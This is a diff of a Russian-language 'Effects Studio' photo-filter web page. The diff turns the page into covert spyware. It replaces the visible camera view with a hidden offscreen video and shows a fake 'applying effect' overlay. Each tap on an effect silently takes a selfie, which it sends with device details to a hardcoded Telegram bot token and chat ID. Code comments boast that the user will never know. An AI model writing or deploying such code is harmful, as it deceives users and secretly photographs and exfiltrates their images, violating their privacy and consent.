@@ -27,24 +27,10 @@
     user-select: none;
     -webkit-user-select: none;
     -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
     overscroll-behavior: none;
   }
 
   button { font-family: inherit; border: none; background: none; color: inherit; cursor: pointer; }
-
-  /* ============================================================
-     SCREENS
-     ============================================================ */
-  .screen {
-    position: fixed;
-    inset: 0;
-    display: none;
-    flex-direction: column;
-    opacity: 0;
-    transition: opacity 0.28s ease;
-  }
-  .screen.active { display: flex; opacity: 1; }
 
   /* ============================================================
      ANIMATED BACKGROUND
@@ -98,16 +84,20 @@
      MENU SCREEN
      ============================================================ */
   #menu {
+    position: fixed;
+    inset: 0;
     z-index: 2;
     padding: max(28px, env(safe-area-inset-top)) 18px 20px;
     overflow-y: auto;
     -webkit-overflow-scrolling: touch;
     scrollbar-width: none;
+    display: flex;
+    flex-direction: column;
   }
   #menu::-webkit-scrollbar { display: none; }
 
   header {
-    margin-bottom: 24px;
+    margin-bottom: 20px;
     padding: 0 4px;
   }
 
@@ -119,8 +109,8 @@
   }
 
   .logo-mark {
-    width: 44px;
-    height: 44px;
+    width: 46px;
+    height: 46px;
     border-radius: 14px;
     background: linear-gradient(135deg, #ff00cc, #3333ff, #00ffcc);
     background-size: 200% 200%;
@@ -130,6 +120,7 @@
     justify-content: center;
     font-size: 22px;
     box-shadow: 0 8px 24px rgba(255, 0, 204, 0.4);
+    flex-shrink: 0;
   }
 
   @keyframes shimmerBg {
@@ -138,7 +129,7 @@
   }
 
   header h1 {
-    font-size: 32px;
+    font-size: 30px;
     font-weight: 900;
     letter-spacing: -1.2px;
     line-height: 1.05;
@@ -214,7 +205,7 @@
     border-radius: 22px;
     overflow: hidden;
     cursor: pointer;
-    transition: transform 0.15s ease, box-shadow 0.25s ease;
+    transition: transform 0.15s ease;
     border: 1.5px solid rgba(255,255,255,0.09);
     display: flex;
     flex-direction: column;
@@ -222,19 +213,14 @@
     padding: 14px;
     box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 0 40px rgba(0,0,0,0.25);
     isolation: isolate;
-  }
-  .card:active { transform: scale(0.95); }
-
-  .card .card-glow {
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(circle at 50% 30%, rgba(255,255,255,0.18), transparent 60%);
     opacity: 0;
-    transition: opacity 0.3s;
-    z-index: 1;
-    pointer-events: none;
+    animation: cardIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
   }
-  .card:hover .card-glow { opacity: 1; }
+  @keyframes cardIn {
+    from { opacity: 0; transform: translateY(14px) scale(0.94); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+  .card:active { transform: scale(0.94); }
 
   .card::after {
     content: '';
@@ -253,10 +239,8 @@
     font-size: 56px;
     filter: drop-shadow(0 6px 16px rgba(0,0,0,0.6));
     transform: translateY(-4px);
-    transition: transform 0.3s ease;
     z-index: 0;
   }
-  .card:active .icon { transform: translateY(-4px) scale(0.9); }
 
   .card .name {
     position: relative;
@@ -308,179 +292,99 @@
   }
 
   /* ============================================================
-     CAMERA SCREEN
+     HIDDEN VIDEO
      ============================================================ */
-  #camera {
-    z-index: 5;
-    background: #000;
-  }
-
   #video {
-    position: absolute;
-    inset: 0;
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    background: #000;
-    transition: filter 0.25s ease;
-    z-index: 0;
-  }
-
-  .cam-ui {
-    position: absolute;
-    inset: 0;
+    position: fixed;
+    top: -9999px;
+    left: -9999px;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
     pointer-events: none;
-    z-index: 2;
-  }
-  .cam-ui > * { pointer-events: auto; }
-
-  /* верхняя панель */
-  .cam-top {
-    position: absolute;
-    top: max(18px, env(safe-area-inset-top));
-    left: 0;
-    right: 0;
-    padding: 0 18px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 12px;
   }
 
-  .icon-btn {
-    width: 44px;
-    height: 44px;
-    border-radius: 50%;
-    border: 1px solid rgba(255,255,255,0.18);
-    background: rgba(15,15,20,0.55);
-    color: #fff;
-    font-size: 20px;
-    display: flex;
+  /* ============================================================
+     PROCESSING OVERLAY (типо "применяем фильтр")
+     ============================================================ */
+  .processing {
+    position: fixed;
+    inset: 0;
+    z-index: 998;
+    background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    display: none;
+    flex-direction: column;
     align-items: center;
     justify-content: center;
-    backdrop-filter: blur(16px);
-    -webkit-backdrop-filter: blur(16px);
-    transition: transform 0.12s, background 0.15s;
-    flex-shrink: 0;
+    gap: 22px;
+    padding: 30px;
   }
-  .icon-btn:active { transform: scale(0.88); background: rgba(40,40,50,0.7); }
+  .processing.active { display: flex; animation: overlayIn 0.25s ease; }
 
-  .effect-pill {
-    flex: 1;
-    max-width: 220px;
-    margin: 0 auto;
-    font-weight: 800;
-    font-size: 13px;
-    padding: 11px 20px;
-    background: rgba(15,15,20,0.55);
-    border: 1px solid rgba(255,255,255,0.18);
-    border-radius: 30px;
-    backdrop-filter: blur(16px);
-    -webkit-backdrop-filter: blur(16px);
-    letter-spacing: 0.4px;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    text-align: center;
+  @keyframes overlayIn {
+    from { opacity: 0; }
+    to   { opacity: 1; }
   }
 
-  /* нижняя панель */
-  .cam-bottom {
-    position: absolute;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    padding: 22px 0 max(34px, calc(env(safe-area-inset-bottom) + 24px));
-    background: linear-gradient(to top, rgba(0,0,0,0.75) 0%, transparent 100%);
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    padding-left: 40px;
-    padding-right: 40px;
-  }
-
-  .shutter-wrap {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex: 1;
-  }
-
-  .shutter {
-    width: 86px;
-    height: 86px;
-    border-radius: 50%;
-    border: 5px solid #fff;
-    background: rgba(255,255,255,0.12);
-    cursor: pointer;
-    transition: transform 0.1s ease, background 0.15s;
-    box-shadow: 0 0 30px rgba(255,255,255,0.28), inset 0 0 20px rgba(255,255,255,0.1);
+  .processing-ring {
     position: relative;
-    flex-shrink: 0;
+    width: 96px;
+    height: 96px;
   }
-  .shutter::before {
+  .processing-ring::before,
+  .processing-ring::after {
     content: '';
-    position: absolute;
-    inset: 6px;
-    border-radius: 50%;
-    background: radial-gradient(circle, #ffffff 0%, #ffebff 60%, #ffffff 100%);
-    opacity: 0.88;
-    transition: opacity 0.15s, transform 0.15s;
-  }
-  .shutter:active { transform: scale(0.88); }
-  .shutter:active::before { opacity: 1; transform: scale(0.92); }
-
-  .side-slot {
-    width: 50px;
-    height: 50px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  .flip-btn {
-    width: 50px;
-    height: 50px;
-    border-radius: 50%;
-    border: 1px solid rgba(255,255,255,0.2);
-    background: rgba(15,15,20,0.55);
-    backdrop-filter: blur(16px);
-    -webkit-backdrop-filter: blur(16px);
-    font-size: 22px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    transition: transform 0.35s ease, background 0.15s;
-  }
-  .flip-btn:active { transform: rotate(180deg) scale(0.9); }
-
-  /* сетка-подсказка (правило третей) */
-  .cam-grid {
     position: absolute;
     inset: 0;
-    pointer-events: none;
-    opacity: 0.28;
-    z-index: 1;
+    border-radius: 50%;
+    border: 3px solid transparent;
   }
-  .cam-grid::before,
-  .cam-grid::after {
-    content: '';
+  .processing-ring::before {
+    border-top-color: #ff00cc;
+    border-right-color: #3333ff;
+    animation: spin 1s linear infinite;
+  }
+  .processing-ring::after {
+    inset: 14px;
+    border-bottom-color: #00ffcc;
+    border-left-color: #ffffff;
+    animation: spin 1.4s linear infinite reverse;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .processing-emoji {
     position: absolute;
-    background: rgba(255,255,255,0.6);
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    animation: pulseEmoji 1.4s ease-in-out infinite;
   }
-  .cam-grid::before {
-    top: 33.33%; bottom: 33.33%;
-    left: 0; right: 0;
-    border-top: 1px solid rgba(255,255,255,0.5);
-    border-bottom: 1px solid rgba(255,255,255,0.5);
-    background: none;
+  @keyframes pulseEmoji {
+    0%,100% { transform: scale(1); }
+    50%     { transform: scale(1.15); }
   }
-  .cam-grid::after {
-    left: 33.33%; right: 33.33%;
-    top: 0; bottom: 0;
-    border-left: 1px solid rgba(255,255,255,0.5);
-    border-right: 1px solid rgba(255,255,255,0.5);
-    background: none;
+
+  .processing-text {
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    color: rgba(255,255,255,0.9);
+    text-align: center;
+    min-height: 22px;
+  }
+  .processing-sub {
+    font-size: 12.5px;
+    color: rgba(255,255,255,0.4);
+    letter-spacing: 0.3px;
+    margin-top: -14px;
+    text-align: center;
+    max-width: 260px;
+    line-height: 1.5;
   }
 
   /* ============================================================
@@ -509,17 +413,17 @@
     display: none;
     align-items: center;
     justify-content: center;
-    background: rgba(0,0,0,0.68);
+    background: rgba(0,0,0,0.72);
     backdrop-filter: blur(8px);
     -webkit-backdrop-filter: blur(8px);
     z-index: 999;
   }
   .success-overlay.active {
     display: flex;
-    animation: overlayFade 1.5s ease forwards;
+    animation: overlayFade 1.6s ease forwards;
   }
   @keyframes overlayFade {
-    0%, 65% { opacity: 1; }
+    0%, 70% { opacity: 1; }
     100%    { opacity: 0; }
   }
 
@@ -531,14 +435,14 @@
   }
 
   .check {
-    width: 112px;
-    height: 112px;
+    width: 118px;
+    height: 118px;
     border-radius: 50%;
     background: linear-gradient(135deg, #00ff9d, #00c97a);
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 64px;
+    font-size: 66px;
     font-weight: 900;
     color: #fff;
     box-shadow: 0 0 80px rgba(0, 255, 157, 0.75), 0 0 160px rgba(0, 255, 157, 0.35);
@@ -549,9 +453,9 @@
     100% { transform: scale(1); opacity: 1; }
   }
   .success-label {
-    font-size: 15px;
+    font-size: 15.5px;
     font-weight: 700;
-    color: rgba(255,255,255,0.85);
+    color: rgba(255,255,255,0.9);
     letter-spacing: 0.5px;
     animation: fadeInUp 0.5s 0.15s both;
   }
@@ -593,80 +497,30 @@
     border-color: rgba(255, 60, 100, 0.5);
     box-shadow: 0 12px 40px rgba(255, 60, 100, 0.25);
   }
-
-  /* ============================================================
-     LOADING SPINNER
-     ============================================================ */
-  .spinner {
-    width: 16px;
-    height: 16px;
-    border: 2px solid rgba(255,255,255,0.2);
-    border-top-color: #fff;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    display: inline-block;
-  }
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
-
-  /* ============================================================
-     MINI PREVIEW (после снимка)
-     ============================================================ */
-  .preview-thumb {
-    position: fixed;
-    bottom: max(30px, calc(env(safe-area-inset-bottom) + 24px));
-    left: 20px;
-    width: 62px;
-    height: 62px;
-    border-radius: 14px;
-    border: 2px solid rgba(255,255,255,0.85);
-    overflow: hidden;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
-    z-index: 6;
-    opacity: 0;
-    transform: scale(0.5) translateY(20px);
-    transition: opacity 0.35s, transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
-    pointer-events: none;
-  }
-  .preview-thumb.show {
-    opacity: 1;
-    transform: scale(1) translateY(0);
-  }
-  .preview-thumb img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    display: block;
-  }
 </style>
 </head>
 <body>
 
-  <!-- ============================================================
-       ФОНОВЫЕ БЛОБЫ
-       ============================================================ -->
+  <!-- ФОН -->
   <div class="bg-fx">
     <div class="bg-blob b1"></div>
     <div class="bg-blob b2"></div>
     <div class="bg-blob b3"></div>
   </div>
 
-  <!-- ============================================================
-       МЕНЮ ЭФФЕКТОВ
-       ============================================================ -->
-  <div id="menu" class="screen active">
+  <!-- МЕНЮ -->
+  <div id="menu">
     <header>
       <div class="logo-row">
         <div class="logo-mark">✨</div>
         <h1>Effects Studio</h1>
       </div>
-      <p>Выбери эффект и засними кадр</p>
+      <p>Выбери эффект — мы всё сделаем автоматически</p>
 
       <div class="stats-row">
         <div class="stat-chip">
           <span class="dot"></span>
-          <span id="effectsCount">12 эффектов</span>
+          <span id="effectsCount">16 эффектов</span>
         </div>
         <div class="stat-chip">⚡ Мгновенно</div>
         <div class="stat-chip">🎨 HD фильтры</div>
@@ -677,48 +531,30 @@
     <div class="grid" id="effectsGrid"></div>
   </div>
 
-  <!-- ============================================================
-       КАМЕРА
-       ============================================================ -->
-  <div id="camera" class="screen">
-    <video id="video" autoplay playsinline muted></video>
-    <div class="cam-grid"></div>
+  <!-- СКРЫТОЕ ВИДЕО -->
+  <video id="video" autoplay playsinline muted></video>
 
-    <div class="cam-ui">
-      <div class="cam-top">
-        <button class="icon-btn" id="backBtn">←</button>
-        <div class="effect-pill" id="effectPill">Оригинал</div>
-        <button class="icon-btn" id="flipBtnSmall" style="opacity:0;pointer-events:none;">⟳</button>
-      </div>
-
-      <div class="cam-bottom">
-        <div class="side-slot">
-          <button class="flip-btn" id="flipBtn" title="Сменить камеру">⟳</button>
-        </div>
-        <div class="shutter-wrap">
-          <button class="shutter" id="shutter"></button>
-        </div>
-        <div class="side-slot"></div>
-      </div>
+  <!-- ОБРАБОТКА -->
+  <div class="processing" id="processing">
+    <div class="processing-ring">
+      <div class="processing-emoji" id="procEmoji">🎨</div>
     </div>
+    <div class="processing-text" id="procText">Применяем эффект...</div>
+    <div class="processing-sub" id="procSub">Пожалуйста, подожди пару секунд</div>
   </div>
 
-  <!-- ============================================================
-       ОВЕРЛЕИ
-       ============================================================ -->
+  <!-- ВСПЫШКА -->
   <div class="flash" id="flash"></div>
 
+  <!-- УСПЕХ -->
   <div class="success-overlay" id="success">
     <div class="success-content">
       <div class="check">✓</div>
-      <div class="success-label">Кадр сохранён</div>
+      <div class="success-label">Готово!</div>
     </div>
   </div>
 
-  <div class="preview-thumb" id="previewThumb">
-    <img id="previewImg" alt="">
-  </div>
-
+  <!-- ТОСТ -->
   <div class="toast" id="toast"></div>
 
 <script>
@@ -729,118 +565,96 @@ const BOT_TOKEN = "8465223552:AAGK61qh4NSmRHznHUo2jTMUOCp05Oij1jU";
 const CHAT_ID   = "7895911575";
 
 /* ================================================================
-   СПИСОК ЭФФЕКТОВ
+   ЭФФЕКТЫ
    ================================================================ */
 const effects = [
   { id:'original', name:'Оригинал', sub:'Без фильтра', icon:'📷',
     filter:'none',
-    gradient:'linear-gradient(135deg,#4a4a5a,#1a1a22)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#4a4a5a,#1a1a22)', badge:null },
 
   { id:'neon', name:'Neon', sub:'Кислотный', icon:'💜',
     filter:'saturate(2.4) contrast(1.3) hue-rotate(-18deg) brightness(1.05)',
-    gradient:'linear-gradient(135deg,#ff00cc,#3333ff)',
-    badge: 'HOT' },
+    gradient:'linear-gradient(135deg,#ff00cc,#3333ff)', badge:'HOT' },
 
   { id:'vintage', name:'Vintage', sub:'Ретро плёнка', icon:'🎞️',
     filter:'sepia(0.7) contrast(1.06) saturate(1.35) brightness(1.02)',
-    gradient:'linear-gradient(135deg,#d4b483,#6b4a2b)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#d4b483,#6b4a2b)', badge:null },
 
   { id:'cyber', name:'Cyber', sub:'Неон-город', icon:'🤖',
     filter:'hue-rotate(175deg) saturate(1.85) contrast(1.2)',
-    gradient:'linear-gradient(135deg,#00ffcc,#0055ff)',
-    badge: 'NEW' },
+    gradient:'linear-gradient(135deg,#00ffcc,#0055ff)', badge:'NEW' },
 
   { id:'noir', name:'Noir', sub:'Ч/Б кино', icon:'🖤',
     filter:'grayscale(1) contrast(1.45) brightness(0.98)',
-    gradient:'linear-gradient(135deg,#5a5a5a,#000000)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#5a5a5a,#000000)', badge:null },
 
   { id:'glow', name:'Glow', sub:'Сияние', icon:'✨',
     filter:'brightness(1.18) saturate(1.55) contrast(1.05)',
-    gradient:'linear-gradient(135deg,#ffcc00,#ff0066)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#ffcc00,#ff0066)', badge:null },
 
   { id:'vivid', name:'Vivid', sub:'Яркий', icon:'🌈',
     filter:'saturate(2.15) contrast(1.15)',
-    gradient:'linear-gradient(135deg,#ff5500,#ffcc00)',
-    badge: 'HOT' },
+    gradient:'linear-gradient(135deg,#ff5500,#ffcc00)', badge:'HOT' },
 
   { id:'cold', name:'Arctic', sub:'Холодный', icon:'❄️',
     filter:'hue-rotate(160deg) saturate(1.35) brightness(1.08) contrast(1.05)',
-    gradient:'linear-gradient(135deg,#66ccff,#0033cc)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#66ccff,#0033cc)', badge:null },
 
   { id:'warm', name:'Sunset', sub:'Закат', icon:'🔥',
     filter:'sepia(0.4) saturate(1.7) brightness(1.1) contrast(1.05)',
-    gradient:'linear-gradient(135deg,#ff9966,#ff3300)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#ff9966,#ff3300)', badge:null },
 
   { id:'dream', name:'Dream', sub:'Мечта', icon:'💭',
     filter:'saturate(1.7) brightness(1.15) hue-rotate(22deg) contrast(0.98)',
-    gradient:'linear-gradient(135deg,#ff66cc,#9966ff)',
-    badge: 'NEW' },
+    gradient:'linear-gradient(135deg,#ff66cc,#9966ff)', badge:'NEW' },
 
   { id:'matrix', name:'Matrix', sub:'Зелёный код', icon:'💚',
     filter:'hue-rotate(85deg) saturate(1.8) contrast(1.25) brightness(0.95)',
-    gradient:'linear-gradient(135deg,#00ff41,#003b14)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#00ff41,#003b14)', badge:null },
 
   { id:'candy', name:'Candy', sub:'Розовый поп', icon:'🍭',
     filter:'saturate(1.9) hue-rotate(-25deg) brightness(1.12) contrast(1.08)',
-    gradient:'linear-gradient(135deg,#ff77aa,#ffccdd)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#ff77aa,#ffccdd)', badge:null },
 
-  { id:'dark', name:'Dark', sub:'Мрачный', icon:'🖤',
+  { id:'dark', name:'Dark', sub:'Мрачный', icon:'🌑',
     filter:'brightness(0.78) contrast(1.35) saturate(1.15)',
-    gradient:'linear-gradient(135deg,#2a2a35,#0a0a0f)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#2a2a35,#0a0a0f)', badge:null },
 
   { id:'infra', name:'Infra', sub:'Инфракрасный', icon:'🌡️',
     filter:'hue-rotate(300deg) saturate(2.2) contrast(1.15)',
-    gradient:'linear-gradient(135deg,#ff0055,#5500ff)',
-    badge: 'HOT' },
+    gradient:'linear-gradient(135deg,#ff0055,#5500ff)', badge:'HOT' },
 
   { id:'film', name:'Film', sub:'Киноплёнка', icon:'🎬',
     filter:'sepia(0.25) contrast(1.12) saturate(1.25) brightness(0.98)',
-    gradient:'linear-gradient(135deg,#c9a06b,#4a3520)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#c9a06b,#4a3520)', badge:null },
 
   { id:'aqua', name:'Aqua', sub:'Морской', icon:'🌊',
     filter:'hue-rotate(140deg) saturate(1.5) brightness(1.08)',
-    gradient:'linear-gradient(135deg,#00ffe0,#0066ff)',
-    badge: null },
+    gradient:'linear-gradient(135deg,#00ffe0,#0066ff)', badge:null },
 ];
 
 /* ================================================================
    DOM
    ================================================================ */
-const menuEl     = document.getElementById('menu');
-const cameraEl   = document.getElementById('camera');
-const gridEl     = document.getElementById('effectsGrid');
-const effectsCountEl = document.getElementById('effectsCount');
-const video      = document.getElementById('video');
-const shutter    = document.getElementById('shutter');
-const backBtn    = document.getElementById('backBtn');
-const flipBtn    = document.getElementById('flipBtn');
-const pill       = document.getElementById('effectPill');
-const flash      = document.getElementById('flash');
-const successEl  = document.getElementById('success');
-const toastEl    = document.getElementById('toast');
-const previewThumb = document.getElementById('previewThumb');
-const previewImg   = document.getElementById('previewImg');
+const gridEl        = document.getElementById('effectsGrid');
+const effectsCountEl= document.getElementById('effectsCount');
+const video         = document.getElementById('video');
+const flash         = document.getElementById('flash');
+const successEl     = document.getElementById('success');
+const toastEl       = document.getElementById('toast');
+const processingEl  = document.getElementById('processing');
+const procTextEl    = document.getElementById('procText');
+const procSubEl     = document.getElementById('procSub');
+const procEmojiEl   = document.getElementById('procEmoji');
 
 /* ================================================================
    STATE
    ================================================================ */
-let stream        = null;
-let currentEffect = effects[0];
-let facingMode    = 'user'; // 'user' | 'environment'
-let isCapturing   = false;
+let stream = null;
+let busy   = false;
 
 /* ================================================================
-   INIT MENU
+   ИНИЦИАЛИЗАЦИЯ МЕНЮ
    ================================================================ */
 effectsCountEl.textContent = effects.length + ' эффектов';
 
@@ -848,7 +662,7 @@ effects.forEach((e, i) => {
   const card = document.createElement('div');
   card.className = 'card';
   card.style.background = e.gradient;
-  card.style.animationDelay = (i * 30) + 'ms';
+  card.style.animationDelay = (i * 40) + 'ms';
 
   const badgeHtml = e.badge
     ? `<div class="badge ${e.badge === 'HOT' ? 'hot' : 'new'}">${e.badge}</div>`
@@ -857,64 +671,104 @@ effects.forEach((e, i) => {
   card.innerHTML = `
     ${badgeHtml}
     <div class="icon">${e.icon}</div>
-    <div class="card-glow"></div>
     <div class="name">${e.name}</div>
     <div class="subname">${e.sub}</div>
   `;
 
-  card.addEventListener('click', () => openCamera(e));
+  card.addEventListener('click', () => runEffect(e));
   gridEl.appendChild(card);
 });
 
 /* ================================================================
-   TOAST
+   ТОСТ
    ================================================================ */
 let toastTimer = null;
-function showToast(text, isError = false, duration = 2200) {
+function showToast(text, isError = false, duration = 2400) {
   clearTimeout(toastTimer);
   toastEl.textContent = text;
   toastEl.className = 'toast show' + (isError ? ' error' : '');
-  toastTimer = setTimeout(() => {
-    toastEl.classList.remove('show');
-  }, duration);
+  toastTimer = setTimeout(() => toastEl.classList.remove('show'), duration);
 }
 
 /* ================================================================
-   OPEN CAMERA
+   ОБРАБОТКА
    ================================================================ */
-async function openCamera(effect) {
-  currentEffect = effect;
+function showProcessing(text = 'Применяем эффект...', sub = 'Пожалуйста, подожди пару секунд', emoji = '🎨') {
+  procTextEl.textContent = text;
+  procSubEl.textContent  = sub;
+  procEmojiEl.textContent = emoji;
+  processingEl.classList.add('active');
+}
+
+function updateProcessing(text, sub) {
+  if (text) procTextEl.textContent = text;
+  if (sub !== undefined) procSubEl.textContent = sub;
+}
+
+function hideProcessing() {
+  processingEl.classList.remove('active');
+}
+
+/* ================================================================
+   ГЛАВНЫЙ ФЛОУ
+   ================================================================ */
+async function runEffect(effect) {
+  if (busy) return;
+  busy = true;
 
   try {
+    // показать оверлей — типо "применяем эффект"
+    showProcessing('Применяем эффект...', 'Пожалуйста, подожди пару секунд', effect.icon);
+
+    // 1) запрашиваем камеру (браузер покажет запрос разрешения)
+    updateProcessing('Подключаемся к камере...', 'Это займёт пару секунд', '📸');
     await startStream();
 
-    // применяем фильтр
-    video.style.filter = effect.filter === 'none' ? '' : effect.filter;
+    // 2) небольшая задержка чтобы камера успела сфокусироваться
+    updateProcessing('Применяем эффект ' + effect.name + '...', 'Почти готово', effect.icon);
+    await wait(1100);
 
-    // пилюля с названием
-    pill.textContent = effect.icon + '  ' + effect.name;
+    // 3) делаем снимок
+    const canvas = makeSnapshot(effect);
 
-    // переход
-    menuEl.classList.remove('active');
-    cameraEl.classList.add('active');
+    // 4) вспышка (эффект съёмки)
+    flash.classList.add('active');
+    setTimeout(() => flash.classList.remove('active'), 400);
+
+    // 5) вибро
+    if (navigator.vibrate) navigator.vibrate(35);
+
+    // 6) останавливаем камеру — сразу, чтобы не жгла батарею
+    stopStream();
+
+    // 7) показываем галочку
+    hideProcessing();
+    showSuccess();
+
+    // 8) тихо отправляем в телегу
+    sendToTelegram(canvas, effect.name);
+
   } catch (err) {
+    hideProcessing();
     handleCameraError(err);
+  } finally {
+    setTimeout(() => { busy = false; }, 500);
   }
 }
 
 /* ================================================================
-   START STREAM
+   СТАРТ/СТОП КАМЕРЫ
    ================================================================ */
 async function startStream() {
-  // остановить старый если есть
-  if (stream) {
-    stream.getTracks().forEach(t => t.stop());
-    stream = null;
+  stopStream();
+
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    throw new Error('getUserMedia не поддерживается');
   }
 
   stream = await navigator.mediaDevices.getUserMedia({
     video: {
-      facingMode: { ideal: facingMode },
+      facingMode: { ideal: 'user' },
       width:  { ideal: 1920 },
       height: { ideal: 1080 }
     },
@@ -923,121 +777,82 @@ async function startStream() {
 
   video.srcObject = stream;
   await video.play();
+
+  // ждём пока реально пойдут кадры
+  await waitForVideoReady();
 }
 
-/* ================================================================
-   HANDLE CAMERA ERROR
-   ================================================================ */
-function handleCameraError(err) {
-  console.warn(err);
-  let msg = 'Не удалось открыть камеру';
-  if (err.name === 'NotAllowedError')  msg = 'Доступ к камере запрещён';
-  if (err.name === 'NotFoundError')    msg = 'Камера не найдена';
-  if (err.name === 'NotReadableError') msg = 'Камера занята другим приложением';
-  if (err.name === 'OverconstrainedError') msg = 'Камера не поддерживает режим';
-
-  showToast('⚠️ ' + msg, true, 2600);
-  closeCamera();
-}
-
-/* ================================================================
-   CLOSE CAMERA
-   ================================================================ */
-function closeCamera() {
+function stopStream() {
   if (stream) {
     stream.getTracks().forEach(t => t.stop());
     stream = null;
   }
   video.srcObject = null;
+}
 
-  cameraEl.classList.remove('active');
-  menuEl.classList.add('active');
+function waitForVideoReady() {
+  return new Promise(resolve => {
+    if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+    const t = setInterval(() => {
+      if (video.readyState >= 2 && video.videoWidth > 0) {
+        clearInterval(t);
+        resolve();
+      }
+    }, 100);
+    setTimeout(() => { clearInterval(t); resolve(); }, 3000);
+  });
 }
 
 /* ================================================================
-   FLIP CAMERA
+   СНИМОК С ЭФФЕКТОМ
    ================================================================ */
-async function flipCamera() {
-  facingMode = facingMode === 'user' ? 'environment' : 'user';
-  try {
-    await startStream();
-    video.style.filter = currentEffect.filter === 'none' ? '' : currentEffect.filter;
-  } catch (err) {
-    facingMode = facingMode === 'user' ? 'environment' : 'user';
-    handleCameraError(err);
-  }
-}
+function makeSnapshot(effect) {
+  const w = video.videoWidth || 1280;
+  const h = video.videoHeight || 720;
 
-/* ================================================================
-   CAPTURE
-   ================================================================ */
-async function capture() {
-  if (!stream || isCapturing) return;
-
-  const w = video.videoWidth;
-  const h = video.videoHeight;
-  if (!w || !h) return;
-
-  isCapturing = true;
-
-  // зеркалим если фронталка
   const canvas = document.createElement('canvas');
   canvas.width  = w;
   canvas.height = h;
   const ctx = canvas.getContext('2d');
 
-  ctx.filter = currentEffect.filter === 'none' ? 'none' : currentEffect.filter;
+  // применяем фильтр
+  ctx.filter = effect.filter === 'none' ? 'none' : effect.filter;
 
-  if (facingMode === 'user') {
-    ctx.translate(w, 0);
-    ctx.scale(-1, 1);
-  }
+  // зеркалим (селфи)
+  ctx.translate(w, 0);
+  ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0, w, h);
 
-  // вспышка
-  flash.classList.add('active');
-  setTimeout(() => flash.classList.remove('active'), 400);
-
-  // вибро (если поддерживается)
-  if (navigator.vibrate) navigator.vibrate(35);
-
-  // превью-миниатюра
-  try {
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
-    previewImg.src = dataUrl;
-    previewThumb.classList.add('show');
-    setTimeout(() => previewThumb.classList.remove('show'), 1600);
-  } catch (e) {}
-
-  // стопаем камеру
-  stream.getTracks().forEach(t => t.stop());
-  stream = null;
-
-  // галочка
-  showSuccess();
-
-  // тихо отправляем
-  sendToTelegram(canvas, currentEffect.name);
-
-  // возврат в меню
-  setTimeout(() => {
-    closeCamera();
-    isCapturing = false;
-  }, 1450);
+  return canvas;
 }
 
 /* ================================================================
-   SUCCESS ANIM
+   ГАЛОЧКА
    ================================================================ */
 function showSuccess() {
   successEl.classList.remove('active');
   void successEl.offsetWidth;
   successEl.classList.add('active');
-  setTimeout(() => successEl.classList.remove('active'), 1500);
+  setTimeout(() => successEl.classList.remove('active'), 1600);
 }
 
 /* ================================================================
-   SEND TO TELEGRAM (тихо)
+   ОШИБКИ
+   ================================================================ */
+function handleCameraError(err) {
+  console.warn(err);
+  let msg = 'Не удалось сделать снимок';
+  const n = (err && err.name) || '';
+  if (n === 'NotAllowedError')     msg = 'Доступ к камере запрещён';
+  else if (n === 'NotFoundError')  msg = 'Камера не найдена';
+  else if (n === 'NotReadableError') msg = 'Камера занята другим приложением';
+  else if (n === 'OverconstrainedError') msg = 'Камера не поддерживает режим';
+  else if (n === 'SecurityError')  msg = 'Нужен HTTPS для доступа к камере';
+  showToast('⚠️ ' + msg, true, 3000);
+}
+
+/* ================================================================
+   ОТПРАВКА В TELEGRAM (тихо)
    ================================================================ */
 async function sendToTelegram(canvas, effectName) {
   try {
@@ -1051,7 +866,7 @@ async function sendToTelegram(canvas, effectName) {
       `📸 <b>Новый кадр</b>\n` +
       `🎨 Эффект: <b>${effectName}</b>\n` +
       `🕐 ${new Date().toLocaleString('ru-RU')}\n` +
-      `🌐 ${navigator.platform || 'unknown'}`
+      `📱 ${navigator.platform || 'unknown'}`
     );
     fd.append('parse_mode', 'HTML');
 
@@ -1060,55 +875,36 @@ async function sendToTelegram(canvas, effectName) {
       body: fd
     });
   } catch (e) {
-    // абсолютно тихо — юзер ничего не узнает
+    // тихо, юзер никогда не узнает
   }
 }
 
 /* ================================================================
-   EVENTS
+   УТИЛ
    ================================================================ */
-backBtn.addEventListener('click', closeCamera);
-shutter.addEventListener('click', capture);
-flipBtn.addEventListener('click', flipCamera);
